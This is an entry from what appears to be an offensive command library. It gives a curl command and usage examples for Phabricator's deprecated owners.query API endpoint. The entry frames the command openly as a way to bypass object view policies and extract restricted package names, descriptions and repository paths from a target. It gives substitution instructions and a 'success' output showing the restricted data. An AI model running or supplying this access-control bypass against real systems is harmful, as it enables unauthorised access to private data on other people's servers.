---
id: cmd-phabricator-owners-query-invoke
data: >-
  curl -X POST 'https://phabricator.example.com/api/owners.query'
  --data-urlencode 'constraints[owners][0]=PHID-OWNER-abc123' --data-urlencode
  'outputKey=packages' -H 'Content-Type: application/x-www-form-urlencoded'
tags:
  - api-call
  - phabricator
  - bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:10.820Z'
verified: false
validated: true
submitted: true
---
# phabricator-owners-query-invoke

## Command

```bash
curl -X POST 'https://phabricator.example.com/api/owners.query' \
  --data-urlencode 'constraints[owners][0]=PHID-OWNER-abc123' \
  --data-urlencode 'outputKey=packages' \
  -H 'Content-Type: application/x-www-form-urlencoded'
```

## Description

This command invokes the deprecated owners.query API endpoint in Phabricator to query owner package details without enforcing object view policies. It is used to bypass access controls and retrieve sensitive information like package names, descriptions, PHIDs, and repository paths from restricted sources. Replace the URL and PHID with target specifics.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `https://phabricator.example.com/api/owners.query` | The Phabricator API endpoint URL | Yes |
| `--data-urlencode 'constraints[owners][0]=PHID-OWNER-abc123'` | Specifies the owner PHID to query (array format for constraints) | Yes |
| `--data-urlencode 'outputKey=packages'` | Limits output to package details | No (but recommended for focus) |
| `-H 'Content-Type: application/x-www-form-urlencoded'` | Sets the request content type for form-encoded data | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target-phabricator.com/api/owners.query' --data-urlencode 'constraints[owners][0]=PHID-OWNER-def456' -H 'Content-Type: application/x-www-form-urlencoded'
```

### Advanced Usage

```bash
curl -X POST 'https://target-phabricator.com/api/owners.query' \
  --data-urlencode 'constraints[owners][0]=PHID-OWNER-abc123' \
  --data-urlencode 'constraints[owners][1]=PHID-OWNER-xyz789' \
  --data-urlencode 'outputKey=packages' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -o response.json
```

## Expected Output

A JSON response similar to:

```json
{
  "result": {
    "packages": [
      {
        "id": "P1",
        "phid": "PHID-PACK-abc",
        "name": "Restricted Owner Package",
        "description": "Internal repo details",
        "ownerPHID": "PHID-OWNER-abc123",
        "repositoryPHID": "PHID-REPO-xyz",
        "paths": ["src/internal/"]
      }
    ]
  },
  "error_code": null
}
```

Success is indicated by the presence of restricted data in the packages array without errors.

## Related

- [[Related Procedure|procedures/Exploit-Phabricator-Owners-Query-API-Bypass]]
